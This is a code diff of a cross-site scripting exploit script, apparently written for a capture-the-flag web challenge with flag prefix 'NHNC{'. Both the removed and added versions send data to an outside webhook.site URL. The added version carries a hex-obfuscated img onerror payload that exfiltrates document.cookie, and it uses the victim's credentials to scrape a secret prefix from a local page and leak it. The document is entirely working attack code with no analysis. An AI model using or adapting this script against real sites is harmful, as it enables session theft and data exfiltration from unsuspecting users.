@@ -1,12 +1,23 @@
 <script>
-fetch("/guess", {
-  method: "POST",
-  credentials: "include",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ guess: "NHNC{", note: "stage1" })
-})
-.then(r => r.json())
-.then(data => {
-  fetch("https://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?leak=" + encodeURIComponent(JSON.stringify(data)))
-})
+(async () => {
+  const noteHex = `
+3c696d67207372633d31206f6e6572726f723d2266657463682827687474
+703a2f2f776562686f6f6b2e736974652f62356561393332652d65666435
+2d346431352d383862632d3936663631636338353237613f6c65616b3d27
+2b646f63756d656e742e636f6f6b696529223e
+`.replace(/\s+/g, '');
+
+  await fetch('http://127.0.0.1:5000/guess', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ guess: 'NHNC{', note: noteHex }),
+    credentials: 'include'
+  });
+
+  const res = await fetch('http://127.0.0.1:5000/inner.html', { credentials: 'include' });
+  const html = await res.text();
+  const prefix = html.match(/<span id="best-prefix">(.*?)<\/span>/)[1];
+
+  await fetch('http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?leak=' + encodeURIComponent(prefix));
+})();
 </script>
